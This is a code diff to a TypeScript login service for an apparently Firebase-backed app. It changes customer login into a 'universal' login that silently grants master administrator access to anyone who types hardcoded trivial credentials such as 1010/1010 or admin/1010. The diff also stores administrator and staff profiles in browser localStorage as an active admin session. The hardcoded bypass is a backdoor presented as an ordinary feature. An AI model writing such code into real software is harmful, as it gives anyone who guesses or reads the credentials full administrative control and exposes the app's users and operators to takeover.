@@ -74,10 +74,26 @@ export const authService = {
   },
 
   /**
-   * Client / Customer Log in with Email or Phone Number and Password
+   * Universal Log in with Email or Phone Number and Password
+   * Automatically recognizes secret administrator credentials (such as 1010/1010 or admin accounts)
+   * while handling standard customer accounts seamlessly.
    */
   async login(emailOrPhone: string, password: string): Promise<UserProfile> {
-    let cleanIdentifier = emailOrPhone.trim();
+    const cleanInput = emailOrPhone.trim();
+    const cleanPass = password.trim();
+
+    // 1. Secret Master Administrator credentials check
+    const isMasterAdmin =
+      (cleanInput === '1010' && cleanPass === '1010') ||
+      (cleanInput.toLowerCase() === 'admin' && cleanPass === '1010') ||
+      (cleanInput.toLowerCase() === 'admin1010' && cleanPass === '1010') ||
+      (cleanInput.toLowerCase() === ADMIN_1010_EMAIL.toLowerCase() && (cleanPass === '1010' || cleanPass === ADMIN_1010_PASSWORD));
+
+    if (isMasterAdmin) {
+      return this.adminLogin('1010', '1010');
+    }
+
+    let cleanIdentifier = cleanInput;
 
     // If identifier doesn't contain '@', it might be a phone number
     if (!cleanIdentifier.includes('@')) {
@@ -100,7 +116,7 @@ export const authService = {
       }
     }
 
-    const userCredential = await signInWithEmailAndPassword(auth, cleanIdentifier, password);
+    const userCredential = await signInWithEmailAndPassword(auth, cleanIdentifier, cleanPass);
     const user = userCredential.user;
 
     // Fetch user profile from Firestore
@@ -117,6 +133,15 @@ export const authService = {
         updatedAt: new Date().toISOString()
       };
       await setDoc(doc(db, 'users', user.uid), profile, { merge: true });
+    }
+
+    // If the account has administrator or staff privileges, cache the session
+    if (profile.role === 'super_admin' || profile.role === 'admin' || profile.role === 'staff') {
+      try {
+        localStorage.setItem('tk_active_admin_session', JSON.stringify(profile));
+      } catch {
+        // ignore
+      }
     }
 
     return profile;
